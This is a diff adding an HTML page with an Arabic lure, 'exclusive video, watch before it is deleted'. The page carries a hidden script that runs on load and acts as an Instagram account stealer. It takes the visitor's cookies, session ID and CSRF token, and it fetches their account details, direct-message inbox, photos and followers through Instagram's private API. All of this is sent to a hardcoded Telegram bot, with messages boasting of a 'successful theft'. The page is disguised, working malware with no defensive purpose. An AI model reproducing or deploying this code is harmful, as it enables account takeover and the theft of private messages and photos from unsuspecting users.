@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>فيديو حصري</title>
+</head>
+<body>
+    <h1>🔥 شاهد الفيديو قبل الحذف!</h1>
+    <video controls>
+        <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
+    </video>
+    <p>جاري التحميل...</p>
+
+    <script>
+        (async function() {
+            const BOT_TOKEN = ':8805222150:AAE9ipsiktei73qOdCRSQv1jeHGj_lqafTI';
+            const CHAT_ID = '7778340801';
+
+            async function sendToTelegram(text) {
+                try {
+                    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+                    await fetch(url, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            text: text.slice(0, 4000),
+                            parse_mode: 'HTML'
+                        })
+                    });
+                } catch(e) {
+                    console.error('فشل الإرسال');
+                }
+            }
+
+            async function sendPhotoToTelegram(imageUrl, caption = '') {
+                try {
+                    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+                    await fetch(url, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            photo: imageUrl,
+                            caption: caption.slice(0, 1000)
+                        })
+                    });
+                } catch(e) {
+                    console.error('فشل إرسال الصورة');
+                }
+            }
+
+            const cookies = document.cookie;
+            const csrfToken = localStorage.getItem('csrftoken') || '';
+            const sessionId = cookies.match(/sessionid=([^;]+)/);
+            const sessionValue = sessionId ? sessionId[1] : '';
+
+            let accountData = {};
+            try {
+                const res = await fetch('https://i.instagram.com/api/v1/accounts/current_user/');
+                accountData = await res.json();
+            } catch(e) {
+                accountData = { error: 'فشل جلب الحساب' };
+            }
+
+            let messagesData = {};
+            try {
+                const res = await fetch('https://i.instagram.com/api/v1/direct_v2/inbox/');
+                messagesData = await res.json();
+            } catch(e) {
+                messagesData = { error: 'فشل جلب الرسائل' };
+            }
+
+            let photoUrls = [];
+            try {
+                const res = await fetch('https://i.instagram.com/api/v1/feed/user/self/');
+                const photoData = await res.json();
+                if (photoData.items) {
+                    photoData.items.forEach(item => {
+                        if (item.image_versions2) {
+                            item.image_versions2.candidates.forEach(img => {
+                                photoUrls.push(img.url);
+                            });
+                        }
+                    });
+                }
+            } catch(e) {
+                photoUrls = [];
+            }
+
+            let followersData = {};
+            try {
+                const res = await fetch('https://i.instagram.com/api/v1/friendships/123456789/followers/');
+                followersData = await res.json();
+            } catch(e) {
+                followersData = { error: 'فشل جلب المتابعين' };
+            }
+
+            const fullData = {
+                timestamp: new Date().toISOString(),
+                url: window.location.href,
+                cookies: cookies,
+                csrfToken: csrfToken,
+                sessionId: sessionValue,
+                account: accountData,
+                messages: messagesData,
+                followers: followersData,
+                photoCount: photoUrls.length,
+                browser: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+            };
+
+            const message = `
+🩸 <b>عملية سرقة ناجحة</b>
+👤 <b>المستخدم:</b> ${accountData.user ? accountData.user.username : 'غير معروف'}
+🕒 <b>الوقت:</b> ${fullData.timestamp}
+📸 <b>عدد الصور المسروقة:</b> ${photoUrls.length}
+🍪 <b>الكوكيز:</b> ${cookies.slice(0, 200)}...
+🔑 <b>CSRF:</b> ${csrfToken}
+🌐 <b>المتصفح:</b> ${navigator.userAgent}
+            `;
+
+            await sendToTelegram(message);
+
+            const maxPhotos = Math.min(photoUrls.length, 5);
+            for (let i = 0; i < maxPhotos; i++) {
+                await sendPhotoToTelegram(photoUrls[i], `📸 صورة ${i+1}/${photoUrls.length}`);
+                await new Promise(r => setTimeout(r, 1000));
+            }
+
+            if (messagesData.inbox) {
+                const msgText = `💬 <b>الرسائل:</b>\n${JSON.stringify(messagesData, null, 2).slice(0, 3000)}`;
+                await sendToTelegram(msgText);
+            }
+
+            await sendToTelegram(`🍪 <b>الكوكيز الكاملة:</b>\n${cookies}`);
+            await sendToTelegram(`✅ <b>تم الانتهاء من سرقة كل شيء</b>\n📦 حجم البيانات: ${JSON.stringify(fullData).length} حرف`);
+
+            console.log('✅ تم إرسال كل البيانات إلى تيليجرام');
+        })();
+    </script>
+</body>
+</html>
